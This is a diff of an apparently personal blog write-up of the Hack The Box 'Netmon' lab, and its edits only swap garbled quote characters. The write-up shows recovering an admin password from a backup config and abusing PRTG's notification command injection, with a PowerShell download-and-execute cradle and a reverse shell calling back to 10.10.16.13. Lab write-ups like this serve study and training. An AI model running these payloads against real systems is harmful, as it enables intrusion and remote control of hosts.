@@ -148,7 +148,7 @@ I proceeded to download all files of interest:
 
 ### Searching for Credentials
 
-I searched these configuration files for any credentials related to the default admin user, `prtgadmin`. While the â€œnewâ€ configuration files did not contain any useful information, I found a backup file that included a password for `prtgadmin`:
+I searched these configuration files for any credentials related to the default admin user, `prtgadmin`. While the €œnew€ configuration files did not contain any useful information, I found a backup file that included a password for `prtgadmin`:
 
 ![Found credentials]({{ '/assets/img/Netmon/image%205.png' | relative_url }})
 
@@ -170,36 +170,36 @@ According to CVE details and an excellent blog post by [Codewatch](https://codew
 
 ### Exploiting Command Injection Vulnerability
 
-To exploit this, I navigated to the â€œNotificationsâ€ section under â€œAccount Settingsâ€ in the â€œSetupâ€ dropdown menu:
+To exploit this, I navigated to the €œNotifications€ section under €œAccount Settings€ in the €œSetup€ dropdown menu:
 
 ![Navigating to Notifications]({{ '/assets/img/Netmon/image%207.png' | relative_url }})
 
-> ðŸ’¡ **Vulnerability Note**: An argument supplied in the â€œParameterâ€ field of the â€œNotificationsâ€ configuration is passed directly into the PowerShell script without any sanitization, allowing an attacker to inject arbitrary PowerShell code.
+> ðŸ’¡ **Vulnerability Note**: An argument supplied in the €œParameter€ field of the €œNotifications€ configuration is passed directly into the PowerShell script without any sanitization, allowing an attacker to inject arbitrary PowerShell code.
 
 ### Setting Up the Reverse Shell Environment
 
 To prepare for a reverse shell, I first created the PowerShell command for establishing the connection:
 
 ```bash
-â”Œâ”€â”€(kaliã‰¿kali)-[~/Red_Team/HTB]
-â””â”€$ echo 'Invoke-PowershellTcp -Reverse -IPAddress 10.10.16.13 -Port 4444' >> /home/kali/Red_Team/Tools/Invoke-PowerShellTcp.ps1 
+”Œ”€”€(kaliã‰¿kali)-[~/Red_Team/HTB]
+”””€$ echo 'Invoke-PowershellTcp -Reverse -IPAddress 10.10.16.13 -Port 4444' >> /home/kali/Red_Team/Tools/Invoke-PowerShellTcp.ps1 
 ```
 
 Next, I encoded the command to download and execute the reverse shell script, converting it to Base64 format:
 
 ```bash
-â”Œâ”€â”€(kaliã‰¿kali)-[~/Red_Team/HTB]
-â””â”€$ echo -n "IEX(new-object net.webclient).downloadstring('http://10.10.16.13:8080/Invoke-PowerShellTcp.ps1')" | iconv -t UTF-16LE | base64 -w0
+”Œ”€”€(kaliã‰¿kali)-[~/Red_Team/HTB]
+”””€$ echo -n "IEX(new-object net.webclient).downloadstring('http://10.10.16.13:8080/Invoke-PowerShellTcp.ps1')" | iconv -t UTF-16LE | base64 -w0
 SQBFAFgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAHMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANgAuADEAMwA6ADgAMAA4ADAALwBJAG4AdgBvAGsAZQAtAFAAbwB3AGUAcgBTAGgAZQBsAGwAVABjAHAALgBwAHMAMQAnACkA     
 ```
 
-**iconv -t UTF-16LE**: This converts the text encoding of the PowerShell command to UTF-16LE (UTF-16 Little Endian), which is often required by Windows PowerShell for Base64-encoded commands. Windows PowerShell expects encoded commands in UTF-16LE, as itâ€™s the default character encoding for PowerShell scripts.
+**iconv -t UTF-16LE**: This converts the text encoding of the PowerShell command to UTF-16LE (UTF-16 Little Endian), which is often required by Windows PowerShell for Base64-encoded commands. Windows PowerShell expects encoded commands in UTF-16LE, as it€™s the default character encoding for PowerShell scripts.
 
 **base64 -w0**: This takes the UTF-16LE encoded command and encodes it in Base64 format. The -w0 option ensures that the output is a single line without any line breaks, which is important for executing the encoded command smoothly.
 
 ### Modifying the Notification Parameter for Command Execution
 
-I then modified the parameter in the Notifications configuration to download and execute â€œInvoke-PowerShellTcp,â€ effectively setting up a reverse shell:
+I then modified the parameter in the Notifications configuration to download and execute €œInvoke-PowerShellTcp,€ effectively setting up a reverse shell:
 
 ![Modifying the parameter]({{ '/assets/img/Netmon/image%208.png' | relative_url }})
 
